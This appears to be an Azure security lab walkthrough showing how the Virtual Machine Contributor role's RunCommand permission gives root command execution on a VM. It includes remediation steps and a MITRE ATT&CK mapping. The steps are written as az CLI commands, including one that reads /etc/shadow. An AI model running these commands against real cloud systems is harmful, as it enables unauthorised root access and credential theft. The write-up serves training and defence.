# VM RunCommand — Arbitrary Code Execution via Contributor Role

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Compute / Privilege Escalation

## Scenario

An attacker account has been granted **Virtual Machine Contributor** on a resource
group containing a Linux VM. This role is intended to allow VM management (resize,
restart, etc.), but it also includes `Microsoft.Compute/virtualMachines/runCommand/action`
— which executes arbitrary shell commands on the VM **as root**, without requiring
SSH access, network connectivity, or knowledge of any credentials.

The flag is stored in `/root/flag.txt` on the VM.

## Attack Path

```
[Attacker] Azure AD user (Virtual Machine Contributor on RG)
    |
    v
az vm run-command invoke --command-id RunShellScript --scripts "cat /root/flag.txt"
    |
    v
stdout  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — List VMs in the resource group

```bash
RESOURCE_GROUP="<resource_group_name>"

az vm list --resource-group "${RESOURCE_GROUP}" \
  --query "[*].{Name:name,Location:location}" \
  --output table
```

### Step 3 — Execute a command on the VM

```bash
VM_NAME="<vm_name>"

az vm run-command invoke \
  --resource-group "${RESOURCE_GROUP}" \
  --name "${VM_NAME}" \
  --command-id RunShellScript \
  --scripts "cat /root/flag.txt" \
  --query "value[0].message" \
  --output tsv
```

### Going further — full shell

```bash
# Dump all environment variables
az vm run-command invoke \
  --resource-group "${RESOURCE_GROUP}" \
  --name "${VM_NAME}" \
  --command-id RunShellScript \
  --scripts "env; id; cat /etc/shadow | head -5"
```

## How to Fix in Production

1. **Use `Virtual Machine Operator` (preview) or a custom role** that excludes
   `Microsoft.Compute/virtualMachines/runCommand/action` for operators who only
   need to start/stop VMs.
2. **Require JIT (Just-in-Time) VM access** for any administrative operations —
   this adds approval gates and time-limited access.
3. **Enable Azure Defender for Servers** — it generates alerts when RunCommand is
   used, especially for suspicious scripts.
4. **Audit RunCommand usage** via Azure Activity Log:
   ```bash
   az monitor activity-log list \
     --resource-group <rg> \
     --query "[?operationName.value=='Microsoft.Compute/virtualMachines/runCommand/action']"
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Command and Scripting Interpreter | [T1059](https://attack.mitre.org/techniques/T1059/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Remote Services | [T1021](https://attack.mitre.org/techniques/T1021/) |
| Privilege Escalation | [T1548](https://attack.mitre.org/techniques/T1548/) |
